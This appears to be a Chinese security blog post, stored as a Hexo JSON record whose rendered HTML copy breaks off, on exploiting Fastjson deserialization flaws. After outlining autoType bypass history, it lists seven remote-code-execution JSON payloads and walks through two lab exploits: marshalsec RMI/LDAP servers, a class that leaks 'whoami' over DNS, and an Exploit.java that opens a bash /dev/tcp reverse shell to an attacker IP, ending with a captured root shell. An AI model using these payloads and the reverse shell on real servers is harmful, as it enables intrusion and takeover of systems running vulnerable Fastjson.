\"ldap://localhost:1389/Object\"\n      ]\n    }\n  }\n}\n```\n```\npayload5:\n{\n  \"rand1\": Set[\n  {\n    \"@type\": \"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\n    \"beanFactory\": {\n      \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n      \"shareableResources\": [\n        \"ldap://localhost:1389/obj\"\n      ]\n    },\n    \"adviceBeanName\": \"ldap://localhost:1389/obj\"\n  },\n  {\n    \"@type\": \"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"\n  }\n]}\n```\n```\npayload6:\n{\n  \"rand1\": {\n    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n    \"userOverridesAsString\": \"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;\"\n  }\n}\n```\n```\npayload7:\n{\n  \"rand1\": {\n    \"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n    \"jndiName\": \"ldap://localhost:1389/Object\",\n    \"loginTimeout\": 0\n  }\n}\n```\n# 实战渗透测试\n\n## Fastjson<1.2.24远程代码执行\n1、使用docker搭建环境\n![upload successful](/images/15/1.png) \n\n2、访问IP:8090显示此页面表示搭建成功\n![upload successful](/images/15/2.png) \n\n3、攻击机中dnslog.java文件，内容如下：\n```\nimport java.lang.Runtime;\n\nimport java.lang.Process;\n\npublic class dnslog{\n\n    static {\n\n        try {\n\n            Runtime rt = Runtime.getRuntime();\n\n            String[] commands = { \"/bin/sh\", \"-c\", \"ping user.`whoami`.dnslog地址\"};\n\n            Process pc = rt.exec(commands);\n\n            pc.waitFor();\n\n        } catch (Exception e) {\n\n            // do nothing\n\n        }\n\n    }\n\n}\n```\n\n4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。\n![upload successful](/images/15/3.png) \n\n5、将两个文件通过python3 -m http.server命令放到外网环境中\n![upload successful](/images/15/4.png) \n![upload successful](/images/15/5.png) \n\n6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class\n![upload successful](/images/15/6.png)\n\n```\ngit clone https://github.com/mbechler/marshalsec.git\ncd marshalsec/\n编译项目\nmvn clean package -DskipTests\n```\n\n成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件\n![upload successful](/images/15/7.png) \n\n7、在当前主机通过生成的marshalsec文件运行rmi服务\n```\ncd target/\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.229.158:4455/#dnslog\" 9999\n```\n![upload successful](/images/15/8.png) \n\n7、在漏洞页面bp抓包后post提交数据，替换如下payload：\n```\nAccept:*/*\nContent-Type: application/json\n\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.229.158:9999/dnslog\",\n        \"autoCommit\":true\n}\n}\n```\n![upload successful](/images/15/9.png)\n\n8、在dnslog可以看到回显了whoami的结果为root\n![upload successful](/images/15/10.png) \n\n## Fastjson<1.2.48远程代码执行漏洞\n1、首先使用docker搭建环境\n![upload successful](/images/15/11.png) \n\n2、访问8090端口显示页面表示搭建成功\n![upload successful](/images/15/12.png) \n\n3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。\n```\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\npublic class Exploit{\n    public Exploit() throws Exception {\n\n        Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/192.168.4.187/4554;cat <&5 | while read line; do $line 2>&5 >&5; done\"});\n        InputStream is = p.getInputStream();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n\n        String line;\n        while((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        p.waitFor();\n        is.close();\n        reader.close();\n        p.destroy();\n    }\n    public static void main(String[] args) throws Exception {\n\n    }\n\n}\n```\n4、使用javac命令编译Exploit.java文件，得到Exploit.class文件\n![upload successful](/images/15/13.png)  \n5、将两个文件通过python3 -m http.server命令放到外网环境中\n![upload successful](/images/15/14.png)  \n![upload successful](/images/15/15.png) \n\n6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666\n```\n![upload successful](/images/15/16.png)\n\n7、客户端开启监听，这里我使用windows的nc进行监听\n![upload successful](/images/15/17.png)\n\n8、抓取数据包，更换传参方式为post，放入payload：\n```\nAccept: */*\nContent-Type: application/json\n\n{\n    \"name\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n    },\n    \"x\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"ldap://192.168.229.158:6666/Exploit\",\n        \"autoCommit\":true\n    }\n}\n```\n![upload successful](/images/15/18.png) \n\n9、查看监听，已经成功获取了服务器的shell\n![upload successful](/images/15/19.png)  \n","source":"_posts/漏洞复现-Fastjson全方位利用.md","raw":"---\ntitle: 漏洞复现-Fastjson全方位利用\ntags: \n  - 漏洞复现\n  - Fastjson\n  - 反序列化\n  - 反弹shell\n  - 命令执行\ncategories: 漏洞复现\nkeywords: '漏洞复现,Fastjson,反序列化,反弹shell,命令执行'\ndescription: 漏洞复现-Fastjson全方位利用\ncover: https://img1.baidu.com/it/u=4236482212,3196079296&fm=26&fmt=auto&gp=0.jpg\ndate: 2021-06-08 10:45:41\n---\n\n\n\nFastJson为什么经常爆出安全漏洞？\n罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。\n如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。\n\n# 概念\nfastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。\t\nFastJson特点如下：\n>（1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。\t\n（2）顾名思义，FastJson操作JSON的速度是非常快的。\t\n（3）无其他包的依赖。\t\n（4）使用比较方便。\t\n\n# Fastjson指纹特征及判别方法\n## 根据返回包判断\n任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。\n\n## Dnslog盲打\n```\n{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog网址\"}}\n{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog网址\"}}\n{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog网址\"}}\n{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog网址\"}}}\n{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}}\n```\n```\n一些畸形payload，不过依然可以触发dnslog：\n{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog网址\"}}\"\"}}\n{\"rand7\":Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}]}\n{\"rand8\":Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}\n{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}:0\n```\n# Fastjson历史漏洞\n## ver<=1.2.24\n1.2.24及之前没有任何防御，并且autotype默认开启。\n## ver>=1.2.25&ver<=1.2.41\n从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。\n## ver=1.2.42\n在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。\n## ver=1.2.43\n在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，\\[也被特殊处理了，又再次绕过了checkAutoType。\n## ver=1.2.44\n修复了1.2.43的绕过，处理了\\[。删除了之前的L开头、;结尾、LL开头的判断，改成了\\[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。\n## ver>=1.2.45&ver<1.2.46\n这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。\n## ver=1.2.47\n这个版本发生了不开启autotype情况下能利用成功的绕过。\n解析一下这次的绕过：\n\n利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过\t\n这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中\t\n如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回\t\n## ver>=1.2.48&ver<=1.2.68\n在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类\n## ver=1.2.68\n1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。\n\n# 一些RCE Payload\n```\npayload1:\n{\n  \"rand1\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://localhost:1389/Object\",\n    \"autoCommit\": true\n  }\n}\n```\n```\npayload2:\n{\n  \"rand1\": {\n    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n    \"_bytecodes\": [\n      \"yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"\n    ],\n    \"_name\": \"aaa\",\n    \"_tfactory\": {},\n    \"_outputProperties\": {}\n  }\n}\n```\n```\npayload3:\n{\n  \"rand1\": {\n    \"@type\": \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n    \"properties\": {\n      \"data_source\": \"ldap://localhost:1389/Object\"\n    }\n  }\n}\n```\n```\npayload4:\n{\n  \"rand1\": {\n    \"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\n    \"targetBeanName\": \"ldap://localhost:1389/Object\",\n    \"propertyPath\": \"foo\",\n    \"beanFactory\": {\n      \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n      \"shareableResources\": [\n        \"ldap://localhost:1389/Object\"\n      ]\n    }\n  }\n}\n```\n```\npayload5:\n{\n  \"rand1\": Set[\n  {\n    \"@type\": \"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\n    \"beanFactory\": {\n      \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n      \"shareableResources\": [\n        \"ldap://localhost:1389/obj\"\n      ]\n    },\n    \"adviceBeanName\": \"ldap://localhost:1389/obj\"\n  },\n  {\n    \"@type\": \"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"\n  }\n]}\n```\n```\npayload6:\n{\n  \"rand1\": {\n    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n    \"userOverridesAsString\": \"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;\"\n  }\n}\n```\n```\npayload7:\n{\n  \"rand1\": {\n    \"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n    \"jndiName\": \"ldap://localhost:1389/Object\",\n    \"loginTimeout\": 0\n  }\n}\n```\n# 实战渗透测试\n\n## Fastjson<1.2.24远程代码执行\n1、使用docker搭建环境\n![upload successful](/images/15/1.png) \n\n2、访问IP:8090显示此页面表示搭建成功\n![upload successful](/images/15/2.png) \n\n3、攻击机中dnslog.java文件，内容如下：\n```\nimport java.lang.Runtime;\n\nimport java.lang.Process;\n\npublic class dnslog{\n\n    static {\n\n        try {\n\n            Runtime rt = Runtime.getRuntime();\n\n            String[] commands = { \"/bin/sh\", \"-c\", \"ping user.`whoami`.dnslog地址\"};\n\n            Process pc = rt.exec(commands);\n\n            pc.waitFor();\n\n        } catch (Exception e) {\n\n            // do nothing\n\n        }\n\n    }\n\n}\n```\n\n4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。\n![upload successful](/images/15/3.png) \n\n5、将两个文件通过python3 -m http.server命令放到外网环境中\n![upload successful](/images/15/4.png) \n![upload successful](/images/15/5.png) \n\n6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class\n![upload successful](/images/15/6.png)\n\n```\ngit clone https://github.com/mbechler/marshalsec.git\ncd marshalsec/\n编译项目\nmvn clean package -DskipTests\n```\n\n成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件\n![upload successful](/images/15/7.png) \n\n7、在当前主机通过生成的marshalsec文件运行rmi服务\n```\ncd target/\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.229.158:4455/#dnslog\" 9999\n```\n![upload successful](/images/15/8.png) \n\n7、在漏洞页面bp抓包后post提交数据，替换如下payload：\n```\nAccept:*/*\nContent-Type: application/json\n\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.229.158:9999/dnslog\",\n        \"autoCommit\":true\n}\n}\n```\n![upload successful](/images/15/9.png)\n\n8、在dnslog可以看到回显了whoami的结果为root\n![upload successful](/images/15/10.png) \n\n## Fastjson<1.2.48远程代码执行漏洞\n1、首先使用docker搭建环境\n![upload successful](/images/15/11.png) \n\n2、访问8090端口显示页面表示搭建成功\n![upload successful](/images/15/12.png) \n\n3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。\n```\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\npublic class Exploit{\n    public Exploit() throws Exception {\n\n        Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/192.168.4.187/4554;cat <&5 | while read line; do $line 2>&5 >&5; done\"});\n        InputStream is = p.getInputStream();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n\n        String line;\n        while((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        p.waitFor();\n        is.close();\n        reader.close();\n        p.destroy();\n    }\n    public static void main(String[] args) throws Exception {\n\n    }\n\n}\n```\n4、使用javac命令编译Exploit.java文件，得到Exploit.class文件\n![upload successful](/images/15/13.png)  \n5、将两个文件通过python3 -m http.server命令放到外网环境中\n![upload successful](/images/15/14.png)  \n![upload successful](/images/15/15.png) \n\n6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666\n```\n![upload successful](/images/15/16.png)\n\n7、客户端开启监听，这里我使用windows的nc进行监听\n![upload successful](/images/15/17.png)\n\n8、抓取数据包，更换传参方式为post，放入payload：\n```\nAccept: */*\nContent-Type: application/json\n\n{\n    \"name\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n    },\n    \"x\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"ldap://192.168.229.158:6666/Exploit\",\n        \"autoCommit\":true\n    }\n}\n```\n![upload successful](/images/15/18.png) \n\n9、查看监听，已经成功获取了服务器的shell\n![upload successful](/images/15/19.png)  \n","slug":"漏洞复现-Fastjson全方位利用","published":1,"updated":"2021-08-07T16:21:07.213Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfm001bvkq3fp0672jj","content":"<p>FastJson为什么经常爆出安全漏洞？<br>罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。<br>如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。</p>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><p>fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>FastJson特点如下：</p>\n<blockquote>\n<p>（1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。<br>（2）顾名思义，FastJson操作JSON的速度是非常快的。<br>（3）无其他包的依赖。<br>（4）使用比较方便。    </p>\n</blockquote>\n<h1 id=\"Fastjson指纹特征及判别方法\"><a href=\"#Fastjson指纹特征及判别方法\" class=\"headerlink\" title=\"Fastjson指纹特征及判别方法\"></a>Fastjson指纹特征及判别方法</h1><h2 id=\"根据返回包判断\"><a href=\"#根据返回包判断\" class=\"headerlink\" title=\"根据返回包判断\"></a>根据返回包判断</h2><p>任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。</p>\n<h2 id=\"Dnslog盲打\"><a href=\"#Dnslog盲打\" class=\"headerlink\" title=\"Dnslog盲打\"></a>Dnslog盲打</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;rand1&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand2&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand3&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand4&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand5&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一些畸形payload，不过依然可以触发dnslog：</span><br><span class=\"line\">&#123;&quot;rand6&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&quot;rand7&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;]&#125;</span><br><span class=\"line\">&#123;&quot;rand8&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;</span><br><span class=\"line\">&#123;&quot;rand9&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;:0</span><br></pre></td></tr></table></figure>\n<h1 id=\"Fastjson历史漏洞\"><a href=\"#Fastjson历史漏洞\" class=\"headerlink\" title=\"Fastjson历史漏洞\"></a>Fastjson历史漏洞</h1><h2 id=\"ver-lt-1-2-24\"><a href=\"#ver-lt-1-2-24\" class=\"headerlink\" title=\"ver&lt;=1.2.24\"></a>ver&lt;=1.2.24</h2><p>1.2.24及之前没有任何防御，并且autotype默认开启。</p>\n<h2 id=\"ver-gt-1-2-25-amp-ver-lt-1-2-41\"><a href=\"#ver-gt-1-2-25-amp-ver-lt-1-2-41\" class=\"headerlink\" title=\"ver&gt;=1.2.25&amp;ver&lt;=1.2.41\"></a>ver&gt;=1.2.25&amp;ver&lt;=1.2.41</h2><p>从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。</p>\n<h2 id=\"ver-1-2-42\"><a href=\"#ver-1-2-42\" class=\"headerlink\" title=\"ver=1.2.42\"></a>ver=1.2.42</h2><p>在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。</p>\n<h2 id=\"ver-1-2-43\"><a href=\"#ver-1-2-43\" class=\"headerlink\" title=\"ver=1.2.43\"></a>ver=1.2.43</h2><p>在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，[也被特殊处理了，又再次绕过了checkAutoType。</p>\n<h2 id=\"ver-1-2-44\"><a href=\"#ver-1-2-44\" class=\"headerlink\" title=\"ver=1.2.44\"></a>ver=1.2.44</h2><p>修复了1.2.43的绕过，处理了[。删除了之前的L开头、;结尾、LL开头的判断，改成了[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。</p>\n<h2 id=\"ver-gt-1-2-45-amp-ver-lt-1-2-46\"><a href=\"#ver-gt-1-2-45-amp-ver-lt-1-2-46\" class=\"headerlink\" title=\"ver&gt;=1.2.45&amp;ver&lt;1.2.46\"></a>ver&gt;=1.2.45&amp;ver&lt;1.2.46</h2><p>这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。</p>\n<h2 id=\"ver-1-2-47\"><a href=\"#ver-1-2-47\" class=\"headerlink\" title=\"ver=1.2.47\"></a>ver=1.2.47</h2><p>这个版本发生了不开启autotype情况下能利用成功的绕过。<br>解析一下这次的绕过：</p>\n<p>利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过<br>这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中<br>如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回    </p>\n<h2 id=\"ver-gt-1-2-48-amp-ver-lt-1-2-68\"><a href=\"#ver-gt-1-2-48-amp-ver-lt-1-2-68\" class=\"headerlink\" title=\"ver&gt;=1.2.48&amp;ver&lt;=1.2.68\"></a>ver&gt;=1.2.48&amp;ver&lt;=1.2.68</h2><p>在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类</p>\n<h2 id=\"ver-1-2-68\"><a href=\"#ver-1-2-68\" class=\"headerlink\" title=\"ver=1.2.68\"></a>ver=1.2.68</h2><p>1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。</p>\n<h1 id=\"一些RCE-Payload\"><a href=\"#一些RCE-Payload\" class=\"headerlink\" title=\"一些RCE Payload\"></a>一些RCE Payload</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;: true</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2:</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;rand1&quot;: &#123;</span><br><span class=\"line\">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class=\"line\">    &quot;_bytecodes&quot;: [</span><br><span class=\"line\">      